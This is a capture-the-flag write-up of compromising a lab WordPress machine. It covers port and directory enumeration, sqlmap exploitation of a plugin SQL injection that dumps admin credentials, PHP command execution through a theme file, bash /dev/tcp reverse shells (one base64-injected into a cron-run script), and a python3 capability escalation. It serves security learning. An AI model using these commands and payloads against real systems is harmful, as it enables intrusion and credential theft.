As always, I begin by scanning ports and service, using Nmap with the following flags:

- `-p-` to scan all ports,
- `--open` to display only open ports and ignore those that are closed or filtered,
- `--min-rate 5000` to send a minimum of 5000 packets per second,
- `-n` to disable reverse DNS lookup,
- `-Pn` to assume the host is alive,
- `-sS` for a SYN scan, which is a stealth technique that does not complete TCP connections,
- `-vvv` for increased verbosity.

```
sudo nmap -p- --open --min-rate 5000 -n -Pn -sS 172.17.0.2 -oN logsnmap 

```

![[attachment/46c3726eeb4563595305c10e84208266.png]]

Only two ports were open, suggesting that the intrusion point is likely through the website. To gather more information, I used the WhatWeb tool.

```
whatweb http://172.17.0.2/ 
```

![[attachment/65522c0eb2d6e4319822df9772dd7618.png]]

The output provided some details about the target, such as the meta generator for Drupal 8. Let's check the website in a browser.

![[attachment/63c696cfb8c9fad81f95acaaf335928a.png]]

The site initially displayed a motivational message and another message instructing users to check mails on `yopmail.com`. After visiting `yopmail.com`, it appeared to be a temporary and anonymous email service. If we knew the email address, we could check its inbox. For now, we note this service for potential use later.
![[attachment/59f3d73cca7a735c83f98f49b99f4d69.png]]

Returning to our original site, the source code was obfuscated and we can observe that Drupal version 8 is being utilized.

![[attachment/6481442fca4f8c8ba9b1bd1efeaa47a2.png]]

Wappalyzer also confirms the usage of Drupal 8 CMS. So, we used the tool Droopescan to analyze the site for vulnerabilities. However, for some peculiar reason, the website is not recognized as Drupal. Therefore, I utilized FFUF to search for hidden directories.

```
ffuf -u http://172.17.0.2/FUZZ -w $fuzz -e .php,.txt,.html 
```

![[attachment/47324a91a05c910ef1c328bdb06fe21d.png]]

The directories found by FFUF suggest that the site is built on WordPress. We can access the WordPress login panel. Attempting to log in with the username and password "admin" results in an error indicating incorrect credentials and a warning of two remaining login attempts, implying some protection against brute force attacks. Thus, we cannot enumerate valid users or apply brute force on this site.

![[attachment/28ab02ad0df0cdb7c12824805e487a55.png]]

Knowing it’s a WordPress site, we manually enumerated themes and plugins in the source code but found nothing significant. Next, we used the "wpscan" tool to gather more information about this WordPress site:

```
wpscan --url http://172.17.0.2/ --enumerate 
```

![[attachment/0e2952079803ef84486ed282eeacff39.png]]

Wpscan initially failed to identify the website as a WordPress site. After attempting different scan options, we utilized the '--force' option, enabling WPScan to successfully detect WordPress. However, it did not reveal any installed themes or plugins.

![[attachment/67faf24c7df4c520521f2efa458e90f9.png]]

Since FFUF previously detected directories indicative of WordPress, we continued manual enumeration. The file `xmlrpc.php` is not present. The `xmlrpc` API, if enabled and misconfigured, can allow attacks such as XML-RPC pingbacks and brute force attacks. However, in our case, it is not active, so no actions can be taken.

Upon enumerating directories, we found the "plugins" directory, which exists but doesn't list any content. We decided to fuzz for plugins present in the system using a wordlist for WordPress plugins from [this repository](https://github.com/kongsec/Wordpress-BruteForce-List/blob/main/Fuzz):

```
❯ wget https://raw.githubusercontent.com/kongsec/Wordpress-BruteForce-List/main/Fuzz
❯ grep "/wp-content/plugins/" Fuzz > pluginsfuzz 
	❯ ffuf -u http://172.17.0.2/FUZZ -w pluginsfuzz -fs 0
```

![[attachment/f5fa9414962b8af95519c49d34421b20.png]]

Using this method, we discovered an interesting plugin. Checking it in the browser revealed more information.
![[attachment/0ccc9200dc420d8363c5d6ed6a8105b1.png]]

According to our research, version 1.2.2 of the WP Fastest Cache plugin has a known SQL injection vulnerability, allowing an attacker to execute SQL queries on the system without authentication.

This SQL injection vulnerability is time-based, so we used sqlmap to automate the exploitation process:
```
❯ sqlmap --dbms=mysql -u "http://172.17.0.2/wp-login.php" --cookie='wordpress_logged_in=*' -dbs --batch  --level=2
available databases [2]:
[*] information_schema
[*] wordpress

❯ sqlmap --dbms=mysql -u "http://172.17.0.2/wp-login.php" --cookie='wordpress_logged_in=*' -D wordpress -tables --batch --level=2
Database: wordpress
[13 tables]
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_loginizer_logs     |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

❯ sqlmap --dbms=mysql -u "http://172.17.0.2/wp-login.php" --cookie='wordpress_logged_in=*' -D wordpress -T wp_users -dump --batch  --level=2

Database: wordpress
Table: wp_users
[1 entry]
+----+-------------------+------------------------------------+------------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| ID | user_url          | user_pass                          | user_email             | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
+----+-------------------+------------------------------------+------------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| 1  | http://172.17.0.2 | $P$BlCPtU.MZfjzs.1XeV6idsQWD.j0AL. | dockerlabs@yopmail.com | admin      | 0           | admin        | admin         | 2024-06-07 23:48:21 | 1717858554:$P$B.OWB2QOje2dpgrz0GKCjVxQuwsA9d/ |
+----+-------------------+------------------------------------+------------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+

```

Thanks to the WordPress plugin vulnerability, we were able to obtain credentials for the WordPress administrator. However, the issue arises with the password, as it is encrypted and cannot be decrypted to plaintext.

But there's more to discover—the user's email address uses the domain "yopmail.com," which correlates with the message we noticed earlier during enumeration. By trying the admin user's email on the yopmail service, we were able to access their inbox.

![[attachment/78af99c07651395482eeeb8f5328cb98.png]]

Within the inbox, we found plaintext credentials for the WordPress administrator, granting us access to the WordPress admin panel.

![[attachment/80145f930ddb94600ec36100cea3c98a.png]]

As administrators, we can currently edit the PHP source code of an inactive theme to execute system commands. The issue lies in the disabled theme editor.

![[attachment/ae3ba9e1df7c976cb684b51ea90e64bd.png]]

looking the plugins installed in wordpress, we discovered an interesting one "**Disable Everything**, *This plugin is used to disable all unused options that are slowing down your site. Doing so will improve your website performance.*"

![[attachment/de7f13a7f282ec7292ac01d737097664.png]]

This plugin disables the 'Plugin and Theme Editor' in WordPress; once enabled, we can insert our code directly into a theme.

![[attachment/a8c06a360746e292aabe7459783f48f3.png]]

![[attachment/2d132a38df4b2095ac64dbebf860b16d.png]]

I tried the RCE, but it didn't work. Upon further investigation, I discovered there is a vhost. Using the IP for RCE didn't work, but using the vhost did, ==I don't know why==
 
```
❯ ❯ curl -s 'http://norc.labs/wp-content/themes/twentytwentytwo/index.php?cmd=id'                                                                                                      ─╯
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![[attachment/992cb5ccc2c49dfdcec11d05bda5e71c.png]]

Now, with remote command execution capabilities, we can deploy a reverse shell to gain access to the server.

```
bash -c 'bash -i &>/dev/tcp/192.168.1.105/1234 <&1'
```

![[attachment/14ed20188cb422542d37614bdef2a9ce.png]]

Upon reviewing the home directory for additional users, there is a user named 'kvzlx'. Initially, this directory appears empty; however, upon executing the command 'ls -la', a hidden script is revealed:

![[attachment/0c511fa6fcf047ad3ef17aa12553bcbe.png]]

We don't have permission to execute this script, but we can view its contents.

![[attachment/11f5150420c75a051435bf9a9c5a7a56.png]]

This script reads an encrypted password from a file, decodes it, saves the decoded password to another file, and then executes the decoded password as a command. The script's behavior is unusual, so we examined the file it generates in the /tmp directory.

![[attachment/bad8e2361caccafd52fe00d2e9edb8b6.png]]

The file is empty, so we checked the source file from which the script reads, but this file doesn't exist. One thing we can do is create it, since we have permission to write in the directory.

![[attachment/0054f5275e6ee72c35180fe323496763.png]]

However, we first need to determine how the script is executed. After checking the cron jobs, we did not find any evidence that this script runs at regular intervals.

```shell
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Therefore, we used the tool pspy, a command-line tool used to view running processes without needing root privileges. It can show us commands run by other users, cron jobs, etc.

![[attachment/4c896c64b77da7ddd46116d43fad8ec4.png]]

Using pspy, we observed that the user `kvzlx` executes a specific script every minute. This means any malicious command we manage to inject will be executed with the privileges of this user. To exploit this, we injected a reverse shell to gain access as `kvzlx`.

First, we need to encode our reverse shell in base64:

```
echo "bash -i &>/dev/tcp/192.168.1.105/1234 <&1" | base64; echo
```

 ![[attachment/92c9b1872de6b2a5048e5424d8f3b3cb.png]]
 
We then create the file `.wp-encrypted.txt` and insert the base64-encoded payload. 
On our attacking machine, we start a listener using `nc` and wait for the script to execute the injected code.
```
nc -nlvp 1234
```

We gained shell access as the user 'kvzlx'.

![[attachment/dad17fdaa19bbe5c68b9af3eec304711.png]]

This time, we used Linpeas to enumerate the system, searching for a way to escalate privileges.

![[attachment/6257f61261b6b1a8f738932880fb5d0b.png]]

Linpeas identified some noteworthy capabilities associated with the python3 binary.
"The cap_setuid capability is probably the most common one we see in CTF’s. This capability provides a user with the ability to run whatever binary that has this capability set as root. If we find that a binary such as a scripting language (python, perl, node, etc.) is assigned this capability, we can use system commands to easily setup an in-place upgrade to root." [Source](https://juggernaut-sec.com/capabilities/#cap_setuid)

We might have been able to leverage this capability with the `www-data` user, the user through which we gained initial access. However, upon review, this user does not have permission to execute `/opt/python3`.

![[attachment/725e3c661dd6bd4792146f5b9b9d61ed.png]]

Therefore, we absolutely needed to gain access as the user kvzlx. Once we have access as this user, we will exploit this capability to gain root access.

![[attachment/a509016e8c94f20ef8cefce8fccff324.png]]

![[attachment/812074873275eca686dccc84c38c73fb.png]]
